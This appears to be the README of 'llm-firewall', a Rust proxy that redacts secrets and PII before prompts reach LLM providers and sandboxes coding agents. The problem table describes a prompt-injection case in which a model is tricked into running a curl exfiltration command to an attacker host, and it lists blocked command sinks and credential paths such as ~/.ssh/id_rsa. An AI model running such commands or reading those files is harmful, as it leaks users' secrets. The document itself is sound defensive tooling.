<div align="center">

# `llm-firewall`
### Security Firewall & Compliance Proxy for AI Coding Assistants

[![Rust](https://img.shields.io/badge/rust-1.85.0%2B-orange.svg?style=flat-square&logo=rust)](https://www.rust-lang.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square)](LICENSE)
[![Latency](https://img.shields.io/badge/p99%20latency-%3C1ms-brightgreen.svg?style=flat-square)](#performance-and-latency)
[![Security](https://img.shields.io/badge/security-100%25%20fail--closed-red.svg?style=flat-square)](#security-invariants)
[![Compliance](https://img.shields.io/badge/compliance-SOC2%20%7C%20HIPAA%20%7C%20GDPR%20%7C%20PCI--DSS-purple.svg?style=flat-square)](#5-llm-firewall-report)

**Stop leaking API keys, proprietary secrets, and customer PII to external LLM providers.**  
`llm-firewall` is a local proxy CLI that redacts secrets before requests leave your machine and restores them on the return stream.

[Quick Start](#quick-start) • [Use Cases](#core-use-cases-and-deployment-modes) • [CLI Commands](#cli-commands) • [How It Works](#how-it-works) • [Supported Tools](#supported-ai-tools) • [Compliance](#5-llm-firewall-report) • [Changelog](CHANGELOG.md)

---

</div>

## The Problem

When you or your team use AI coding assistants (**Claude Code**, **Cursor**, **Copilot**, **Devin**, **OpenHands**), files, prompts, and terminal outputs are sent directly to cloud LLM providers over TLS.

| Risk | Without `llm-firewall` | With `llm-firewall` |
| :--- | :--- | :--- |
| **API Keys & Credentials** | Leaked in prompts (`.env`, AWS, GitHub, Stripe) | Swapped with indexed tokens (`[REDACTED_API_KEY_1]`) |
| **Customer PII & Health Data** | Uploaded unredacted (SSNs, emails, names, MRNs) | Redacted via 4-tier ML/NER engine |
| **Prompt Injection Exfiltration** | Model tricked into running `curl https://attacker.com?key=...` | Lookbehind scanner blocks secret re-injection into dangerous sinks |
| **Rogue Agent File Access** | Agent reads `~/.ssh/id_rsa` or `/etc/passwd` | Strict workspace sandbox and physical path jail |
| **Audit & Compliance** | Zero visibility into what data was exposed | Instant SOC 2, HIPAA, and GDPR audit logs |

---

## Core Use Cases and Deployment Modes

| Use Case | Target Audience | How It Works |
| :--- | :--- | :--- |
| **Autonomous Agent Sandbox** | Users running **Claude Code**, **Cline**, **OpenHands** | Enforces a strict workspace boundary and pre-flight approval plan (`llm-firewall preflight`), blocking autonomous agents from reading `~/.ssh`, `.env`, or sensitive system files. |
| **IDE Protection** | Developers using **Cursor**, **VS Code Copilot** | Transparent MITM proxy (`llm-firewall on`) creates trusted local certs, intercepts outbound prompts, and restores redacted values in the streaming response. |
| **Centralized Team Gateway** | Engineering Orgs & DevOps | Run as a Docker container on your internal network. Point `OPENAI_BASE_URL` or `ANTHROPIC_BASE_URL` to the firewall to enforce company-wide secret scrubbing without changing local setups. |
| **Prompt Injection Defense** | Security & AppSec Teams | Uses Aho-Corasick matching to block token restoration inside command execution sinks (`curl`, `wget`, `eval`, `subprocess`, `os.system`). |
| **SOC 2, HIPAA & GDPR Audits** | CISOs & Compliance Officers | Generates immutable, timestamped audit reports (`llm-firewall report`) proving zero raw secret exposure and tracking risk avoided. |

---

## Quick Start

### 1. Install

**Option A: Pre-compiled binaries (macOS / Linux / Windows)**  
Download the latest binary from [GitHub Releases](https://github.com/devg24/llm-firewall/releases).

```bash
# macOS (Apple Silicon) example
curl -LO https://github.com/devg24/llm-firewall/releases/latest/download/llm-firewall-aarch64-apple-darwin.tar.gz
tar -xzf llm-firewall-aarch64-apple-darwin.tar.gz
sudo mv llm-firewall /usr/local/bin/
```

**Option B: Via Cargo**
```bash
cargo install --git https://github.com/devg24/llm-firewall.git
```

**Option C: Build from source**
```bash
git clone https://github.com/devg24/llm-firewall.git
cd llm-firewall
cargo build --release
sudo cp target/release/llm-firewall-rs /usr/local/bin/llm-firewall
```

### 2. Scan your repository for exposed secrets

```bash
llm-firewall scan
```

### 3. Start transparent protection

```bash
llm-firewall on
```

`llm-firewall on` creates and trusts a local CA certificate, configures your installed tools (**Cursor**, **Copilot**, **Claude Code**), and intercepts outbound traffic. On exit (`Ctrl+C`), it restores original settings and removes the local CA.

---

## CLI Commands

```text
USAGE:
    llm-firewall [COMMAND] [OPTIONS]

COMMANDS:
    scan        Scan workspace for exposed secrets and generate a risk report
    on          Start transparent MITM proxy and configure installed tools
    preflight   Generate and approve an unattended security plan for autonomous agents
    stats       Display aggregate detection metrics and financial risk avoided
    report      Generate audit reports for SOC 2, HIPAA, GDPR, and PCI-DSS
    [default]   Start standard proxy server on port 3000
```

---

### 1. `llm-firewall scan`
Run a static security audit of your codebase before running AI assistants.

```bash
llm-firewall scan
```

```text
================================================================================
                    LLM FIREWALL — WORKSPACE EXPOSURE SCAN
================================================================================
  Scanned: 1,420 files (0.42s)
  Detected Secrets & PII: 14 matches across 4 files

  FILE                          TYPE                 LINE   SEVERITY
  -----------------------------------------------------------------------------
  .env.production               AWS Access Key       12     CRITICAL
  config/database.yml           Database URI         8      HIGH
  src/auth/jwt.rs               Private RSA Key      45     CRITICAL
  tests/fixtures/users.json     Customer Email (x11) 2-13   MEDIUM

  ESTIMATED BREACH EXPOSURE AVOIDED: $34,500 USD
================================================================================
```

---

### 2. `llm-firewall on`
Start the MITM proxy with automated OS trust management.

```bash
llm-firewall on
```

- Generates an ephemeral local CA certificate and adds it to the OS trust store.
- Discovers installed AI tools (**Cursor**, **VS Code Copilot**, **Claude Code**) and patches their proxy settings.
- Intercepts requests and redacts sensitive tokens in under 1ms.
- Restores original values in the return Server-Sent Events (SSE) stream.
- **Teardown**: When stopped (`Ctrl+C`), removes the CA cert from the trust store and restores original settings.

---

### 3. `llm-firewall preflight`
Security plan generator for long-running autonomous agent workflows (Claude Code, SWE-bench, OpenHands).

Before running unattended AI coding tasks, pre-approve sensitive zones and confine the agent to your workspace.

```bash
# Generate plan and preview sensitive zones
llm-firewall preflight

# Auto-approve for non-interactive CI/CD pipelines
llm-firewall preflight --yes

# View active security plan
llm-firewall preflight --show

# Clear security plan
llm-firewall preflight --clear
```

```text
================================================================================
                 PRE-FLIGHT SECURITY PLAN (.guardian-plan.json)
================================================================================
  Sandbox Root:     /Users/dev/workspace/my-project (STRICT JAIL ACTIVE)
  Sensitive Zones:  3 predicted zones
  Status:           APPROVED FOR UNATTENDED OPERATION

  ZONE                          DETECTED TYPES       MATCHES   STRATEGY
  -----------------------------------------------------------------------------
  .env.local                    AwsKey, BearerToken  3         Redact
  src/secrets.rs                HighEntropyKey       1         Redact
  deploy/credentials.json       ApiKey               2         Redact

  [Sandbox Enforcement]
  ✓ Symlink traversal breakout: BLOCKED (evaluated to physical target)
  ✓ Out-of-boundary paths (/etc, ~/.ssh): REJECTED with 403 Forbidden
================================================================================
```

---

### 4. `llm-firewall stats`
Inspect aggregate detection counts and calculated risk reduction.

```bash
# View all-time detection stats
llm-firewall stats

# Filter by time window
llm-firewall stats --since 24h
llm-firewall stats --since 7d

# Output JSON
llm-firewall stats --json
```

```text
================================================================================
                   LLM FIREWALL — CUMULATIVE DETECTION STATS
================================================================================
  Time Range:                   Last 24 Hours
  Total Requests Intercepted:   312
  Total Sensitive Tokens Saved: 89

  DETECTION BY TIER
  -----------------------------------------------------------------------------
  Tier 1 (Deterministic Regex): 54 matches  (AWS keys, Bearer tokens, Emails)
  Tier 2 (Shannon Entropy):     28 matches  (High-entropy API secrets)
  Tier 3 (Local BERT NER):       7 matches  (Person names, MRNs)
  Dangerous Sinks Blocked:       2 events   (curl / eval injection attempts)
  Sandbox Violations Blocked:    1 event    (attempted read of ~/.ssh/id_rsa)

  FINANCIAL RISK MITIGATED:     $67,500 USD
================================================================================
```

---

### 5. `llm-firewall report`
Export audit reports for compliance reviews and security teams.

```bash
# Markdown report
llm-firewall report --output compliance-audit.md

# Structured JSON report
llm-firewall report --format json --output compliance-audit.json

# Include individual event logs
llm-firewall report --detailed --output audit-full.md
```

#### Supported Compliance Frameworks

| Framework | Control ID | Requirement | Firewall Enforcement |
| :--- | :--- | :--- | :--- |
| **SOC 2 Type II** | `CC6.1` | Logical Access Controls | Redaction of cloud credentials, tokens, and private keys |
| **SOC 2 Type II** | `CC6.6` | Boundary Protection | Path canonicalization confining AI to workspace boundary |
| **SOC 2 Type II** | `CC6.7` | Transmission Security | Reversible pseudonymization with zero raw secret transit |
| **HIPAA** | `§ 164.312(a)(1)` | Access Safeguards | BERT NER redaction of patient names, IDs, and health data |
| **HIPAA** | `§ 164.312(e)(1)` | Transmission Security | Zero ePHI or SSN records transmitted to external model APIs |
| **GDPR** | `Article 32` | Security of Processing | Pseudonymization of emails, IPs, phone numbers, and names |
| **PCI-DSS v4.0** | `Req 3.3 / 3.4` | Primary Account Masking | Luhn-validated credit card token masking |
| **PCI-DSS v4.0** | `Req 10.2` | Automated Audit Trails | Append-only JSONL event ledger with SHA-256 integrity digest |

---

## How It Works

```mermaid
flowchart TD
    subgraph Client ["Client Layer"]
        IDE["Cursor / Claude Code / Copilot / SDK"]
    end

    subgraph Proxy ["LLM Firewall Proxy Engine (Axum + Tokio)"]
        Inbound["Outbound Request Intercepted"]
        
        subgraph Pipeline ["4-Tier Detection Pipeline"]
            T1["Tier 1: Deterministic Regex<br/>(AWS, GitHub, Stripe, SSN, CC, PII)"]
            T2["Tier 2: Contextual Shannon Entropy<br/>(API keys, Passwords, Hex Secrets)"]
            T3["Tier 3: Local BERT NER (Candle)<br/>(Contextual Names, Healthcare PII)"]
            T4["Tier 4: ML Classifier (ORT)<br/>(Ambiguous Boundary Spans)"]
        end

        Jail["Sandbox & Path Validator<br/>(Physical symlink evaluation)"]
        Map["Request-Scoped TokenMap<br/>(No persistent global storage)"]
        Mutator["Streaming SSE Mutator<br/>(512-byte lookbehind sink check)"]
    end

    subgraph Cloud ["Upstream LLM Provider"]
        LLM["api.openai.com / api.anthropic.com"]
    end

    subgraph Audit ["Compliance & Telemetry"]
        Ledger["~/.guardian/audit.jsonl<br/>(0o600 Append-Only Log)"]
    end

    IDE -->|1. Prompt Payload| Inbound
    Inbound --> Jail
    Jail -->|Out-of-bounds path| Reject["403 Forbidden"]
    Jail -->|Valid path| Pipeline
    T1 --> T2 --> T3 --> T4
    Pipeline -->|2. Swap secrets with [REDACTED_*]| Map
    Map -->|3. Forward sanitized prompt| LLM
    LLM -->|4. Inbound SSE Response Stream| Mutator
    Mutator -->|5a. Dangerous Sink Detected (e.g. curl)| Quarantine["Block & Quarantine Secret"]
    Mutator -->|5b. Safe Context| ReInject["Re-inject original value"]
    ReInject -->|6. Unredacted Stream to User| IDE
    Inbound -.->|Non-blocking event dispatch| Ledger
```

---

## Supported AI Tools

| Tool | Integration Mode | Mechanism | Setup |
| :--- | :--- | :--- | :--- |
| **Cursor** | Single-Port TCP CONNECT Tunneling | Deep `RunSSE` / `BidiAppend` payload interception with inline block responses | Automated via `llm-firewall on` |
| **Claude Code** | Transparent Forward Proxy | Sets `HTTP_PROXY` / `HTTPS_PROXY` with CA trust | Automated via `llm-firewall on` |
| **GitHub Copilot** | VS Code / JetBrains Proxy | Configures `http.proxy` and local certificate trust | Automated via `llm-firewall on` |
| **OpenAI / Anthropic SDKs** | Reverse Proxy Multiplexer | Set `base_url = "http://localhost:3000/v1"` | Zero code changes required |
| **LangChain / LlamaIndex** | Standard HTTP/HTTPS Proxy | Native HTTP proxy support via single-port peeker | Set proxy env or client config |
| **Autonomous Agents (SWE-bench, Devin)** | Sandboxed Execution | `llm-firewall preflight` + `llm-firewall on` | Path jail and pre-approved plan |

---

## Configuration (`.guardian.toml`)

`llm-firewall` works without configuration by default, but supports repository-level tuning via `.guardian.toml`:

```toml
# Auto-detects domain profile (standard, crypto, fintech, healthcare)
domain = "crypto"

[thresholds]
# Shannon entropy threshold (0.0 to 1.0)
entropy_tier = 0.85
# ML classification threshold
classifier_tier = 0.70

[allowlist]
# Known safe variables or test fixtures that should not be redacted
variables = ["TEST_DUMMY_KEY", "MOCK_TOKEN_PUBLIC", "ETH_SAMPLE_ADDR"]

[[custom_rules]]
# Custom regex patterns (ReDoS-checked before compilation)
name = "INTERNAL_PROJECT_ID"
pattern = 'PROJ-[A-Z0-9]{8}'
pii_type = "Custom"
```

---

## Security Invariants

* **Memory Safety**: Written in Rust with memory safety enforced at compile time.
* **Fail-Closed by Design**: If a parser, buffer, or classifier fails, the request fails closed (`403 Forbidden` or `500 Internal Server Error`). Unchecked payloads are never forwarded.
* **Request Isolation**: The `TokenMap` is allocated per request and dropped when the response stream closes.
* **Local ML Execution**: Candle BERT and ONNX models run locally with zero external telemetry or cloud inference dependencies.
* **Sub-Millisecond Overhead**: Hot-path proxy processing adds under 1ms of latency.

---

## Testing & Verification

```bash
# Run all workspace unit, integration, and benchmark tests
cargo test --workspace

# Enforce zero-warning policy
cargo clippy --workspace --all-targets -- -D warnings

# Check formatting
cargo fmt --check
```

---

## Contributing

1. Fork the repository and create a feature branch (`git checkout -b feature/my-feature`).
2. Verify all tests pass (`cargo test --workspace`).
3. Verify linting and formatting (`cargo clippy --workspace --all-targets -- -D warnings` and `cargo fmt --check`).
4. Commit your changes and open a Pull Request.

---

## License

Dual-licensed under:
- **MIT License** ([LICENSE-MIT](LICENSE) or [http://opensource.org/licenses/MIT](http://opensource.org/licenses/MIT))
- **Apache License, Version 2.0** ([LICENSE-APACHE](LICENSE) or [http://www.apache.org/licenses/LICENSE-2.0](http://www.apache.org/licenses/LICENSE-2.0))
